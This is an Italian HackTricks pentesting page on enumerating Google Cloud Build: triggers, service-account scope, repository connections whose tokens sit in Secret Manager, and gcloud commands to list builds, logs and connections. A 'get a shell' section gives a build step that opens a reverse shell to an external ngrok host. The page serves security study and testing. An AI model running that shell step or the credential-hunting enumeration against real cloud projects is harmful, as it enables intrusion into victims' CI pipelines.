# GCP - Enumerazione di Cloud Build

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informazioni di base

Google Cloud Build √® una piattaforma CI/CD gestita che **automatizza la compilazione del software** e i processi di rilascio, integrandosi con **repository di codice sorgente** e supportando una vasta gamma di linguaggi di programmazione. Consente agli sviluppatori di **compilare, testare e distribuire automaticamente il codice** offrendo al contempo la flessibilit√† di personalizzare le fasi di compilazione e i flussi di lavoro.

Ogni Cloud Build Trigger √® **collegato a un Cloud Repository o collegato direttamente a un repository esterno** (Github, Bitbucket e Gitlab).

{% hint style="success" %}
Non ho visto alcun modo per rubare il token di Github/Bitbucket da qui o dai Cloud Repositories perch√© quando il repository viene scaricato viene accessibile tramite un URL [https://source.cloud.google.com/](https://source.cloud.google.com/) e Github non viene accessibile dal client.
{% endhint %}

### Eventi

Cloud Build pu√≤ essere attivato se:

* **Push su un branch**: Specificare il branch
* **Push di un nuovo tag**: Specificare il tag
* **Pull request**: Specificare il branch che riceve la PR
* **Invocazione manuale**
* **Messaggio Pub/Sub**: Specificare l'argomento
* **Evento webhook**: Esporr√† un URL HTTPS e la richiesta deve essere autenticata con un segreto

### Esecuzione

Ci sono 3 opzioni:

* Un file yaml/json **che specifica i comandi** da eseguire. Di solito: `/cloudbuild.yaml`
* Solo uno che pu√≤ essere specificato "inline" nella console web e nella CLI
* Opzione pi√π comune
* Rilevante per l'accesso non autenticato
* Un **Dockerfile** da compilare
* Un **Buildpack** da compilare

### Autorizzazioni SA

Il **Service Account ha lo scope `cloud-platform`**, quindi pu√≤ **usare tutti i privilegi**. Se **nessun SA viene specificato** (come quando si esegue il submit) verr√† utilizzato il **SA predefinito** `<proj-number>@cloudbuild.gserviceaccount.com`.

Di default non vengono fornite autorizzazioni, ma √® abbastanza facile fornirne alcune:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Approvazioni

√à possibile configurare un Cloud Build per **richiedere approvazioni per l'esecuzione della compilazione** (disabilitato per impostazione predefinita).

### Connessioni e Repository

Le connessioni possono essere create su:

* **GitHub:** Mostrer√† un prompt OAuth che chieder√† le autorizzazioni per **ottenere un token Github** che verr√† memorizzato all'interno del **Secret Manager**.
* **GitHub Enterprise:** Chieder√† di installare un **GithubApp**. Verr√† creato e memorizzato in questo progetto un **token di autenticazione** dal tuo host GitHub Enterprise come segreto del **Secret Manager**.
* **GitLab / Enterprise:** √à necessario **fornire il token di accesso API e il token di accesso API di lettura** che verranno memorizzati nel **Secret Manager**.

Una volta generata una connessione, √® possibile utilizzarla per **collegare i repository a cui l'account Github ha accesso**.

Questa opzione √® disponibile tramite il pulsante:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Si noti che i repository collegati con questo metodo sono **disponibili solo nei Trigger che utilizzano la 2a generazione**.
{% endhint %}

### Collega un Repository

Questo non √® lo stesso di una **`connessione`**. Questo consente **diversi** modi per ottenere **accesso a un repository Github o Bitbucket** ma **non genera un oggetto di connessione, ma genera un oggetto repository (di 1a generazione).**

Questa opzione √® disponibile tramite il pulsante:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Archiviazione

A volte Cloud Build **generer√† un nuovo archivio per archiviare i file per il trigger**. Questo accade ad esempio nell'esempio che GCP offre con:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Un bucket di archiviazione chiamato [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) viene creato per archiviare un file `.tgz` con i file da utilizzare.

### Ottieni la shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Enumerazione

Potresti trovare **informazioni sensibili nelle configurazioni e nei log di build**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Escalazione dei privilegi

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Accesso non autenticato

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post Esploitation

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
